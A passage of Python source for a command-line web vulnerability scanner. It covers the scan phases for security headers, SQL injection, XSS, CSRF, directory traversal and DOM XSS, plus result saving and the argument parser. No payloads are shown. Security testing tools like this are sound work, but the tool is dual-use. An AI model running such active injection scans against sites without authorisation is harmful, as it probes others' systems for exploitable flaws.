            # Phase 2: Security Header Checks
            logger.info("=" * 60)
            logger.info("Phase 2: Security header analysis")
            logger.info("=" * 60)
            header_scanner = SecurityHeaderScanner(self._session, self.rate_limit)
            header_progress = ProgressBar(len(urls), "Header checks")
            for url in urls:
                findings = await header_scanner.scan_url(url)
                self.results.findings.extend(findings)
                header_progress.update()
            header_progress.finish()

            # Phase 3: Vulnerability Scanning
            if not self.headers_only:
                logger.info("=" * 60)
                logger.info("Phase 3: Vulnerability scanning")
                logger.info("=" * 60)
                sqli_scanner = SQLInjectionScanner(self._session, self.rate_limit)
                xss_scanner = XSSScanner(self._session, self.rate_limit)
                csrf_scanner = CSRFScanner(self._session, self.rate_limit)
                traversal_scanner = DirectoryTraversalScanner(self._session, self.rate_limit)

                total_forms = len(forms)
                vuln_progress = ProgressBar(total_forms if total_forms > 0 else 1, "Form testing")

                for url, form in forms:
                    # SQL Injection
                    findings = await sqli_scanner.scan_form(url, form)
                    self.results.findings.extend(findings)

                    # XSS
                    findings = await xss_scanner.scan_form(url, form)
                    self.results.findings.extend(findings)

                    # CSRF
                    findings = await csrf_scanner.scan_form(url, form)
                    self.results.findings.extend(findings)

                    # Directory Traversal
                    findings = await traversal_scanner.scan_form(url, form)
                    self.results.findings.extend(findings)

                    vuln_progress.update()
                vuln_progress.finish()

                # Phase 4: DOM XSS check on crawled pages
                logger.info("=" * 60)
                logger.info("Phase 4: DOM XSS analysis")
                logger.info("=" * 60)
                dom_progress = ProgressBar(len(urls), "DOM analysis")
                for url in urls:
                    try:
                        async with self._session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                            if resp.status == 200:
                                body = await resp.text(errors="ignore")
                                finding = xss_scanner.test_dom_based(url, body)
                                if finding:
                                    self.results.findings.append(finding)
                    except (aiohttp.ClientError, asyncio.TimeoutError):
                        pass
                    dom_progress.update()
                dom_progress.finish()
            else:
                logger.info("Skipping vulnerability scanning (headers-only mode)")

        finally:
            if self._session:
                await self._session.close()

        self.results.duration_seconds = round(time.time() - start_time, 1)

        # Summary
        logger.info("=" * 60)
        logger.info("Scan Complete")
        logger.info("=" * 60)
        summary = self.results.to_dict()["summary"]
        logger.info(f"URLs scanned: {summary['urls_scanned']}")
        logger.info(f"Forms found: {summary['forms_found']}")
        logger.info(f"Total findings: {summary['total_findings']}")
        logger.info(f"  Critical: {summary['critical']}")
        logger.info(f"  High: {summary['high']}")
        logger.info(f"  Medium: {summary['medium']}")
        logger.info(f"  Low: {summary['low']}")
        logger.info(f"  Info: {summary['info']}")
        logger.info(f"Duration: {self.results.duration_seconds}s")

        return self.results.to_dict()

    def save(self):
        """Save results to JSON file."""
        output_path = Path(self.output)
        output_path.parent.mkdir(parents=True, exist_ok=True)
        with open(output_path, "w") as f:
            json.dump(self.results.to_dict(), f, indent=2)
        logger.info(f"Results saved to {output_path}")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Web Vulnerability Scanner - SQL injection, XSS, CSRF, directory traversal, security headers",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s https://example.com
  %(prog)s http://target.local -d 3 -p 100 --rate 5
  %(prog)s https://example.com -o scan.json -v
  %(prog)s http://192.168.1.1:8080 --max-pages 20
        """,
    )
    parser.add_argument(
        "target",
        help="Target URL to scan (e.g., https://example.com)",
    )
    parser.add_argument(
        "-o", "--output",
        help="Output JSON file path",
    )
    parser.add_argument(
        "-d", "--depth",
        type=int,
        default=2,
        help="Max crawl depth (default: 2)",
    )
    parser.add_argument(
        "--max-pages",
        type=int,
        default=50,
        help="Max pages to crawl (default: 50)",
    )
    parser.add_argument(
        "--rate",
        type=float,
        default=10.0,
        help="Max concurrent requests (default: 10)",
    )
    parser.add_argument(
        "-t", "--timeout",
        type=int,
        default=15,
        help="Request timeout in seconds (default: 15)",
    )
    parser.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="Enable verbose/debug logging",
    )
    parser.add_argument(
        "--json-stdout",
        action="store_true",
        help="Print JSON results to stdout",
    )
    parser.add_argument(
        "--headers-only",
        action="store_true",
        help="Only check security headers (skip injection tests)",
    )
    return parser.parse_args()


async def main():
    args = parse_args()

    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    scanner = WebVulnerabilityScanner(
        target=args.target,
        output=args.output,
        rate_limit=args.rate,
        max_depth=args.depth,
        max_pages=args.max_pages,
        timeout=args.timeout,
        headers_only=args.headers_only,
    )

    try:
        results = await scanner.run()
        scanner.save()

        if args.json_stdout:
            print(json.dumps(results, indent=2))

    except KeyboardInterrupt:
        logger.warning("Scan interrupted by user")
        sys.exit(1)
    except Exception as e:
        logger.error(f"Scan failed: {e}", exc_info=True)
        sys.exit(1)


if __name__ == "__main__":
    asyncio.run(main())
